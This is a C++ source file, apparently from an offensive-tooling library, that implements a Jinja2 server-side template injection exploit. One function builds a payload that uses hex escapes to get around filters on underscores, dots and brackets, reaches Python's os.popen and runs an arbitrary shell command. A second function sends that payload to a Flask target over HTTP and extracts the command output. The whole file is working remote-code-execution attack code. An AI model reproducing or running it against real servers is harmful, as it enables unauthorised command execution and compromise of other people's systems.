#include "murk/filt/zealous.hpp"

#include "murk/web/ssti.hpp"
#include "murk/web/uri.hpp"
#include "murk/web/http.hpp"
#include "murk/flows/string.hpp"
#include "murk/random.hpp"

namespace murk::web {
  std::string jinja2(std::string_view cmd, std::string delim, bool pretty) {
    // Based on https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#exploit-the-ssti-by-calling-popen-without-guessing-the-offset
    //
    // I then modified out any underscores, square brackets and dots
    return
      "{%set MURKallt=()"
        "|attr('\\x5f\\x5f\\x63\\x6c\\x61\\x73\\x73\\x5f\\x5f')"
        "|attr('\\x5f\\x5f\\x62\\x61\\x73\\x65\\x5f\\x5f')"
        "|attr('\\x5f\\x5f\\x73\\x75\\x62\\x63\\x6c\\x61\\x73\\x73\\x65\\x73\\x5f\\x5f')()"
      "%}"
      "{%for x in MURKallt %}"
        "{%if'\x77\x61\x72\x6e\x69\x6e\x67'in(x|attr('\\x5f\\x5f\\x6e\\x61\\x6d\\x65\\x5f\\x5f'))%}" +
        delim +
          "{{"
            "x()"
            "|attr('\\x5f\\x6d\\x6f\\x64\\x75\\x6c\\x65')"
            "|attr('\\x5f\\x5f\\x62\\x75\\x69\\x6c\\x74\\x69\\x6e\\x73\\x5f\\x5f')"
            "|attr('\x67\x65\x74')('\\x5f\\x5f\\x69\\x6d\\x70\\x6f\\x72\\x74\\x5f\\x5f')('os')"
            "|attr('\x70\x6f\x70\x65\x6e')('" + filt::zealous_escape_c(cmd) + "')"
            "|attr('\x72\x65\x61\x64')()" +
            (pretty ?
              "|replace('\\x3c','\\x26\\x67\\x74\\x3b')" // 'e' seems to mark it as dangerous
              "|replace('\\x0a','\\x3c\\x62\\x72\\x3e')"
            : "") +
            "|safe"
          "}}" +
        delim +
        "{%endif%}"
      "{%endfor%}";
  }

  std::string flask_get(std::string_view addr, std::string_view cmd) {
    std::string s{addr};
    std::string str = random::random_alnum(16);
    s += uri::encode(jinja2(cmd, str, false));
    auto res = murk::web::http::get({s});

    return bounded(res.body, str);
  }
}
